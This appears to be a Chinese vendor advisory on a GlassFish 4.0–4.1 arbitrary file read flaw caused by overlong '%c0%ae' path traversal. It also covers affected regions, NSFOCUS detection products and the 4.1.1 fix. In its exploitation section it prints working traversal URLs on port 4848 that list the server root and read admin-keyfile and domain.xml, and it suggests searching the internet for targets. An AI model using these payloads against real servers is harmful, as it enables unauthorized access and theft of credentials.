# GlassFish任意文件读取漏洞再掀网络安全风云

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MjM5ODYyMTM4MA==&mid=401712193&idx=2&sn=e1838c448a050d78101c170659ee3fa6&chksm=34c2fdea03b574fc8c0a6113dc2bb4a33457ac9dd801b0c17d321ec171c171aab8db090b7048&scene=126&sessionid=1681372635#rd](http://mp.weixin.qq.com/s?__biz=MjM5ODYyMTM4MA==&mid=401712193&idx=2&sn=e1838c448a050d78101c170659ee3fa6&chksm=34c2fdea03b574fc8c0a6113dc2bb4a33457ac9dd801b0c17d321ec171c171aab8db090b7048&scene=126&sessionid=1681372635#rd)

在2015年的10月3日,一位路人甲同学在乌云上发布了一个名为“应用服务器glassfish存在通用任意文件读取漏洞”的漏洞,大致内容如下:

![](../Images/48f3b05b522d65cdd836628769fd7f12.png)  
该事件的有趣点在于一枚真真正正的0day漏洞在乌云上并没有受到太多关注，简单的任意文件读取漏洞标题，其实该漏洞可以列出对应目录文件,基本上等同于源代码泄露,各种敏感信息暴露无遗。  

**漏洞利用方式**

由于在java语言中会把"%c0%ae"解析为"\\uC0AE"，最后转义为ASCCII字符的"."，所以通过"%c0%ae%c0%ae/"（../）可以回朔目录，导致可以变量整个系统的全部目录结构，以及读取下载任意文件内容，从而导致整个系统沦陷。  

通过网络搜索引擎我们搜索受影响的目标，进行漏洞验证。  
通过多个"%c0%ae%c0%ae/"（../）跳转到系统根目录：  

http://\*.\*.\*.\*:4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/

![](../Images/ac5df08b9b9abf0b5aa25db318b8b68a.png)  
读取用户配置文件：

http://\*.\*.\*.\*:4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile

![](../Images/6ce8a164fccf9a02e9a2a86563a07c9f.png)  
读取数据库配置文件：

http://\*.\*.\*.\*:4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/domain.xml

  

![](../Images/5c7362167519637e91982f2a14514ee8.png)  
通过读取系统配置文件及阅读源码，从而登录后台或者直接登录数据库，进一步进行渗透，最终导致严重后果。  
4848端口为GlassFish默认开放的web管理端口，默认配置以及端口对外开放依然是运维人员需要努力去注意的事情了。

  

  

**漏洞影响范围**

据绿盟科技SEER统计，国内影响较严重的城市分别是北京、杭州和台北。

![](../Images/931f9535af55267976c412f28f27c054.png)  

**漏洞检验方案**

绿盟WEB应用漏洞扫描系统（NSFOCUS WVSS）已在第一时间内实现此漏洞的检测技术，请已有WVSS的用户对所管理的网站扫描潜在风险，快速修补。  
此外，绿盟科技蜂巢开发者社区也启动了应急机制，实现GlassFish任意文件读取漏洞的在线检测。

绿盟蜂巢开发者社区供安全爱好者进行网络安全开发经验的学习交流，并提供真实环境供大家开发安全检测插件。从漏洞分析、代码开发、安全交流等多方面来提升自己的能力。同时，安全人员可以方便获取对应插件进行安全测试，共同维护互联网安全。加入蜂巢社区，请联系beehive@nsfocus.com获得注册码。

蜂巢社区地址：https://beehive.nsfocus.com/

  
**官方解决方案**

该漏洞暂时影响GlassFish 4.0至4.1这两个大版本。官方在10月推出最新的4.1.1版本来修复该问题,建议运维人员及时跟进修复漏洞避免影响扩大。  
下载链接：https://glassfish.java.net/download.html  

  
**推荐防护方案**

使用绿盟科技的Web应用防火墙（NSFOCUS WAF）或绿盟WAF可管理安全服务（NSFOCUS MSS for WAF）  
漏洞链接：http://www.wooyun.org/bugs/wooyun-2015-0144595  

  

GlassFish 是一款商业兼容应用服务器，GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。GlassFish凭借开源的、基于社区的JavaEE5实现、具备众多附加功能、具有可伸缩性、具有大量文档等诸多优点令其在很多项目中使用。
